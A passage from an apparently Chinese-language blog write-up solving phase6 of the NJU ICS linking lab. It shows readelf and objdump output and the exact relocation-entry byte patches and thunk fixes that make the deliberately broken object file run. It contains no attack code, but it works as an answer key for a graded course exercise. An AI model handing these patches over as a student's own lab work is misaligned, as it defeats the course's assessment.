<span class="number">00000080</span>   AycPNh</span><br><span class="line"><span class="number">000001</span>ea  <span class="number">00000e01</span> R_386_32          <span class="number">0000010</span>c   aQSEth</span><br><span class="line"><span class="number">00000246</span>  <span class="number">00001002</span> R_386_PC32        <span class="number">000000</span>ef   generate_code</span><br><span class="line"><span class="number">00000263</span>  <span class="number">00000</span>c01 R_386_32          <span class="number">00000100</span>   tqdzfNje</span><br><span class="line"><span class="number">00000256</span>  <span class="number">00000</span>c01 R_386_32          <span class="number">00000100</span>   tqdzfNje</span><br><span class="line"><span class="number">0000015</span>c  <span class="number">00001101</span> R_386_32          <span class="number">00000080</span>   AycPNh</span><br><span class="line"><span class="number">00000268</span>  <span class="number">00001702</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure><h2 id="phase6"><a href="#phase6" class="headerlink" title="phase6"></a>phase6</h2><p>主要用到的知识 <a href="https://grxer.github.io/2023/05/04/ELF%20Dynamical-link/">https://grxer.github.io/2023/05/04/ELF%20Dynamical-link/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase6.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">fish: Job <span class="number">1</span>, <span class="string">&#x27;./linkbomb&#x27;</span> terminated by signal <span class="title function_">SIGSEGV</span> <span class="params">(Address boundary error)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main) [SIGSEGV]&gt; readelf -r phase6.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x9e0</span> contains <span class="number">35</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000007</span>  <span class="number">00001902</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.ax</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">0000005</span>c  <span class="number">00001902</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.ax</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000067</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000083</span>  <span class="number">00000509</span> R_386_GOTOFF      <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">000000b</span>b  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">000000e0</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000f</span>3  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000113</span>  <span class="number">00002102</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00000000</span> R_386_NONE</span><br><span class="line"><span class="number">00000141</span>  <span class="number">00001f</span>04 R_386_PLT32       <span class="number">00000058</span>   transform_code</span><br><span class="line"><span class="number">0000014</span>c  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br><span class="line"><span class="number">0000016</span>c  <span class="number">00002102</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>符号表</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -s phase6.o</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">42</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS phase6.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">3</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">5</span> .data</span><br><span class="line">     <span class="number">4</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">6</span> .bss</span><br><span class="line">     <span class="number">5</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">7</span> .rodata</span><br><span class="line">     <span class="number">6</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">9</span> .data.rel.local</span><br><span class="line">     <span class="number">7</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">11</span> .data.rel</span><br><span class="line">     <span class="number">8</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">13</span> .text.__x86.get_[...]</span><br><span class="line">     <span class="number">9</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">14</span> .text.__x86.get_[...]</span><br><span class="line">    <span class="number">10</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">16</span> .note.GNU-<span class="built_in">stack</span></span><br><span class="line">    <span class="number">11</span>: <span class="number">00000102</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L6</span><br><span class="line">    <span class="number">12</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">17</span> .eh_frame</span><br><span class="line">    <span class="number">13</span>: <span class="number">0000008b</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L14</span><br><span class="line">    <span class="number">14</span>: <span class="number">00000090</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L13</span><br><span class="line">    <span class="number">15</span>: <span class="number">000000</span>a6     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L12</span><br><span class="line">    <span class="number">16</span>: <span class="number">000000b</span>9     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L11</span><br><span class="line">    <span class="number">17</span>: <span class="number">000000</span>cd     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L10</span><br><span class="line">    <span class="number">18</span>: <span class="number">000000</span>de     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L9</span><br><span class="line">    <span class="number">19</span>: <span class="number">000000f</span>1     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT    <span class="number">3</span> .L7</span><br><span class="line">    <span class="number">20</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">15</span> .comment</span><br><span class="line">    <span class="number">21</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .group</span><br><span class="line">    <span class="number">22</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">2</span> .group</span><br><span class="line">    <span class="number">23</span>: <span class="number">00000000</span>   <span class="number">158</span> OBJECT  GLOBAL DEFAULT    <span class="number">5</span> cjHQHR</span><br><span class="line">    <span class="number">24</span>: <span class="number">00000000</span>    <span class="number">88</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> OOtZxJJdNH</span><br><span class="line">    <span class="number">25</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">13</span> __x86.get_pc_thunk.ax</span><br><span class="line">    <span class="number">26</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    <span class="number">27</span>: <span class="number">00000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">9</span> phase_id</span><br><span class="line">    <span class="number">28</span>: <span class="number">000000</span>a0    <span class="number">10</span> OBJECT  GLOBAL DEFAULT    <span class="number">5</span> tqdzfNje</span><br><span class="line">    <span class="number">29</span>: <span class="number">00000020</span>    <span class="number">52</span> OBJECT  GLOBAL DEFAULT    <span class="number">7</span> yAnKQn</span><br><span class="line">    <span class="number">30</span>: <span class="number">000000</span>ac     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">5</span> aQSEth</span><br><span class="line">    <span class="number">31</span>: <span class="number">00000058</span>   <span class="number">179</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> transform_code</span><br><span class="line">    <span class="number">32</span>: <span class="number">0000010b</span>    <span class="number">89</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> generate_code</span><br><span class="line">    <span class="number">33</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">14</span> __x86.get_pc_thunk.bx</span><br><span class="line">    <span class="number">34</span>: <span class="number">00000080</span>   <span class="number">128</span> OBJECT  GLOBAL DEFAULT    <span class="number">7</span> AycPNh</span><br><span class="line">    <span class="number">35</span>: <span class="number">00000164</span>   <span class="number">156</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> encode_1</span><br><span class="line">    <span class="number">36</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">strlen</span></span><br><span class="line">    <span class="number">37</span>: <span class="number">00000200</span>   <span class="number">155</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> encode_2</span><br><span class="line">    <span class="number">38</span>: <span class="number">00000000</span>     <span class="number">8</span> OBJECT  GLOBAL DEFAULT   <span class="number">11</span> encoder</span><br><span class="line">    <span class="number">39</span>: <span class="number">0000029b</span>    <span class="number">82</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> do_phase</span><br><span class="line">    <span class="number">40</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">puts</span></span><br><span class="line">    <span class="number">41</span>: <span class="number">00000008</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">11</span> phase</span><br></pre></td></tr></table></figure><p>首先呢他的getpc函数都是nop，所以需要先修复这个</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Disassembly of section .text.__x86.get_pc_thunk.ax:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line">   <span class="number">0</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">1</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">2</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">3</span>:    <span class="number">90</span>                   nop</span><br><span class="line"></span><br><span class="line">Disassembly of section .text.__x86.get_pc_thunk.bx:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.bx&gt;:</span><br><span class="line">   <span class="number">0</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">1</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">2</span>:    <span class="number">90</span>                   nop</span><br><span class="line">   <span class="number">3</span>:    <span class="number">90</span>                   nop</span><br></pre></td></tr></table></figure><p>修复后</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Disassembly of section .text.__x86.get_pc_thunk.ax:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line">   <span class="number">0</span>:   <span class="number">8b</span> <span class="number">04</span> <span class="number">24</span>                mov    (%esp),%eax</span><br><span class="line">   <span class="number">3</span>:   c3                      ret</span><br><span class="line"></span><br><span class="line">Disassembly of section .text.__x86.get_pc_thunk.bx:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.bx&gt;:</span><br><span class="line">   <span class="number">0</span>:   <span class="number">8b</span> <span class="number">1</span>c <span class="number">24</span>                mov    (%esp),%ebx</span><br><span class="line">   <span class="number">3</span>:   c3                      ret</span><br></pre></td></tr></table></figure><h4 id="generate-code-1"><a href="#generate-code-1" class="headerlink" title="generate_code"></a>generate_code</h4><p>第一个错误</p><p><img src="/2023/05/08/ics4-linklab/image-20230507232413843.png" alt="image-20230507232413843"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507232536405.png" alt="image-20230507232536405"></p><p><img src="/2023/05/08/ics4-linklab/image-20230507233555928.png" alt="image-20230507233555928"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000010b</span> &lt;generate_code&gt;:</span><br><span class="line"> <span class="number">10b</span>:    <span class="number">55</span>                   push   %ebp</span><br><span class="line"> <span class="number">10</span>c:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line"> <span class="number">10</span>e:    <span class="number">53</span>                   push   %ebx</span><br><span class="line"> <span class="number">10f</span>:    <span class="number">83</span> ec <span class="number">14</span>             sub    $<span class="number">0x14</span>,%esp</span><br><span class="line"> <span class="number">112</span>:    e8 fc ff ff ff       call   <span class="number">113</span> &lt;generate_code+<span class="number">0x8</span>&gt; <span class="comment">//__x86.get_pc_thunk.bx</span></span><br><span class="line"> <span class="number">117</span>:    <span class="number">81</span> c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    add    $<span class="number">0x2</span>,%ebx</span><br><span class="line"> <span class="number">11</span>d:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br><span class="line"> <span class="number">123</span>:    <span class="number">8b</span> <span class="number">55</span> <span class="number">08</span>             mov    <span class="number">0x8</span>(%ebp),%edx</span><br><span class="line"> <span class="number">126</span>:    <span class="number">89</span> <span class="number">10</span>                mov    %edx,(%eax)</span><br><span class="line"> <span class="number">128</span>:    c7 <span class="number">45</span> f4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> movl   $<span class="number">0x0</span>,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">12f</span>:    eb <span class="number">25</span>                jmp    <span class="number">156</span> &lt;generate_code+<span class="number">0x4b</span>&gt;</span><br><span class="line"> <span class="number">131</span>:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br><span class="line"> <span class="number">137</span>:    <span class="number">8b</span> <span class="number">00</span>                mov    (%eax),%eax</span><br><span class="line"> <span class="number">139</span>:    <span class="number">83</span> ec <span class="number">08</span>             sub    $<span class="number">0x8</span>,%esp</span><br><span class="line"> <span class="number">13</span>c:    ff <span class="number">75</span> f4             push   <span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">13f</span>:    <span class="number">50</span>                   push   %eax</span><br><span class="line"> <span class="number">140</span>:    e8 fc ff ff ff       call   <span class="number">141</span> &lt;generate_code+<span class="number">0x36</span>&gt;</span><br><span class="line"> <span class="number">145</span>:    <span class="number">83</span> c4 <span class="number">10</span>             add    $<span class="number">0x10</span>,%esp</span><br><span class="line"> <span class="number">148</span>:    <span class="number">89</span> c2                mov    %eax,%edx</span><br><span class="line"> <span class="number">14</span>a:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br><span class="line"> <span class="number">150</span>:    <span class="number">89</span> <span class="number">10</span>                mov    %edx,(%eax)</span><br><span class="line"> <span class="number">152</span>:    <span class="number">83</span> <span class="number">45</span> f4 <span class="number">01</span>          addl   $<span class="number">0x1</span>,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">156</span>:    <span class="number">8b</span> <span class="number">45</span> f4             mov    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line"> <span class="number">159</span>:    <span class="number">83</span> f8 <span class="number">0</span>c             cmp    $<span class="number">0xc</span>,%eax</span><br><span class="line"> <span class="number">15</span>c:    <span class="number">76</span> d3                jbe    <span class="number">131</span> &lt;generate_code+<span class="number">0x26</span>&gt;</span><br><span class="line"> <span class="number">15</span>e:    <span class="number">90</span>                   nop</span><br><span class="line"> <span class="number">15f</span>:    <span class="number">8b</span> <span class="number">5</span>d fc             mov    <span class="number">-0x4</span>(%ebp),%ebx</span><br><span class="line"> <span class="number">162</span>:    c9                   leave  </span><br><span class="line"> <span class="number">163</span>:    c3                   ret  </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">126</span>:    <span class="number">89</span> <span class="number">10</span>                mov    %edx,(%eax)</span><br></pre></td></tr></table></figure><p>失败的原因是eax里的内容是0x2，往上溯源，通过之前在动态链接里的学习,能够发现下面两句是关键</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">117</span>:    <span class="number">81</span> c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    add    $<span class="number">0x2</span>,%ebx</span><br><span class="line"><span class="number">11</span>d:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br></pre></td></tr></table></figure><p><code> 117:81 c3 02 00 00 00    add    $0x2,%ebx</code>这句肯定是在找重定位got表的位置</p><p><code>11d:8b 83 00 00 00 00      mov    0x0(%ebx)</code>是在根据偏移找变量在got表里的位置</p><p>下面这句也一样</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">131</span>:    <span class="number">8b</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%ebx),%eax</span><br></pre></td></tr></table></figure><p>仿照下面去写got重定位就行</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">000002</span>a9  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">19</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>A <span class="number">1</span>A <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>在got里找偏移的就根据下面这个去改写</p><p><code> 14a:8b 83 00 00 00 00    mov    0x0(%ebx),%eax</code>这句已经被重定位过了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000014</span>c  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1F</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>E <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">33</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>E <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><h4 id="transform-code-1"><a href="#transform-code-1" class="headerlink" title="transform_code"></a>transform_code</h4><p><img src="/2023/05/08/ics4-linklab/image-20230508011418971.png" alt="image-20230508011418971"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000058</span> &lt;transform_code&gt;:</span><br><span class="line">  <span class="number">58</span>:    <span class="number">55</span>                   push   %ebp</span><br><span class="line">  <span class="number">59</span>:    <span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line">  <span class="number">5b</span>:    e8 fc ff ff ff       call   <span class="number">5</span>c &lt;transform_code+<span class="number">0x4</span>&gt;<span class="comment">//__x86.get_pc_thunk.ax</span></span><br><span class="line">  <span class="number">60</span>:    <span class="number">05</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       add    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">65</span>:    <span class="number">8b</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%eax),%edx</span><br><span class="line">  <span class="number">6b</span>:    <span class="number">8b</span> <span class="number">4</span>d <span class="number">0</span>c             mov    <span class="number">0xc</span>(%ebp),%ecx</span><br><span class="line">  <span class="number">6</span>e:    <span class="number">8b</span> <span class="number">14</span> <span class="number">8</span>a             <span class="title function_">mov</span>    <span class="params">(%edx,%ecx,<span class="number">4</span>)</span>,%edx</span><br><span class="line">  71:    83 e2 07             and    $0x7,%edx</span><br><span class="line">  74:    83 fa 07             cmp    $0x7,%edx</span><br><span class="line">  77:    0f 87 85 00 00 00    ja     102 &lt;.L6&gt;</span><br><span class="line">  7d:    c1 e2 02             shl    $0x2,%edx</span><br><span class="line">  80:    8b 94 02 54 00 00 00 mov    0<span class="title function_">x54</span><span class="params">(%edx,%eax,<span class="number">1</span>)</span>,%edx</span><br><span class="line">  87:    01 c2                add    %eax,%edx</span><br><span class="line">  89:    ff e2                jmp    *%edx</span><br><span class="line"></span><br><span class="line">0000008b &lt;.L14&gt;:</span><br><span class="line">  8b:    f7 55 08             notl   0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  8e:    eb 76                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">00000090 &lt;.L13&gt;:</span><br><span class="line">  90:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  96:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  99:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  9c:    83 e0 03             and    $0x3,%eax</span><br><span class="line">  9f:    89 c1                mov    %eax,%ecx</span><br><span class="line">  a1:    d3 7d 08             sarl   %cl,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  a4:    eb 60                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000a6 &lt;.L12&gt;:</span><br><span class="line">  a6:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  ac:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  af:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  b2:    f7 d0                not    %eax</span><br><span class="line">  b4:    21 45 08             and    %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  b7:    eb 4d                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000b9 &lt;.L11&gt;:</span><br><span class="line">  b9:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  bf:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  c2:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  c5:    c1 e0 08             shl    $0x8,%eax</span><br><span class="line">  c8:    09 45 08             or     %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  cb:    eb 39                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000cd &lt;.L10&gt;:</span><br><span class="line">  cd:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  d3:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  d6:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  d9:    31 45 08             xor    %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  dc:    eb 28                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000de &lt;.L9&gt;:</span><br><span class="line">  de:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  e4:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  e7:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  ea:    f7 d0                not    %eax</span><br><span class="line">  ec:    09 45 08             or     %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line">  ef:    eb 15                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">000000f1 &lt;.L7&gt;:</span><br><span class="line">  f1:    8b 80 00 00 00 00    mov    0<span class="title function_">x0</span><span class="params">(%eax)</span>,%eax</span><br><span class="line">  f7:    8b 55 0c             mov    0<span class="title function_">xc</span><span class="params">(%ebp)</span>,%edx</span><br><span class="line">  fa:    8b 04 90             <span class="title function_">mov</span>    <span class="params">(%eax,%edx,<span class="number">4</span>)</span>,%eax</span><br><span class="line">  fd:    01 45 08             add    %eax,0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line"> 100:    eb 04                jmp    106 &lt;.L6+0x4&gt;</span><br><span class="line"></span><br><span class="line">00000102 &lt;.L6&gt;:</span><br><span class="line"> 102:    f7 5d 08             negl   0<span class="title function_">x8</span><span class="params">(%ebp)</span></span><br><span class="line"> 105:    90                   nop</span><br><span class="line"> 106:    8b 45 08             mov    0<span class="title function_">x8</span><span class="params">(%ebp)</span>,%eax</span><br><span class="line"> 109:    5d                   pop    %ebp</span><br><span class="line"> 10a:    c3                   ret    </span><br></pre></td></tr></table></figure><p>getpc后</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">5b</span>:    e8 fc ff ff ff       call   <span class="number">5</span>c &lt;transform_code+<span class="number">0x4</span>&gt;<span class="comment">//__x86.get_pc_thunk.ax</span></span><br><span class="line"><span class="number">60</span>:    <span class="number">05</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       add    $<span class="number">0x1</span>,%eax</span><br></pre></td></tr></table></figure><p>基本上下一句都是获取got表位置的重定位,直接把00000007  00001902 R_386_PC32        00000000   __x86.get_pc_thunk.ax这一个一块改了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">61</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>A <span class="number">1</span>A <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">0</span>C <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>A <span class="number">1</span>A <span class="number">00</span> <span class="number">00</span> </span><br></pre></td></tr></table></figure><p>switch case需要重定位的地方</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">90</span>:    <span class="number">8b</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%eax),%eax</span><br><span class="line">a6:    <span class="number">8b</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%eax),%eax</span><br><span class="line">cd:    <span class="number">8b</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%eax),%eax</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">92</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>D <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line">A8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>D <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line">CF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">2B</span> <span class="number">1</span>D <span class="number">00</span> <span class="number">00</span>  </span><br></pre></td></tr></table></figure><p>修正后重定位表</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x9e0</span> contains <span class="number">35</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000007</span>  <span class="number">00001902</span> R_386_PC32        <span 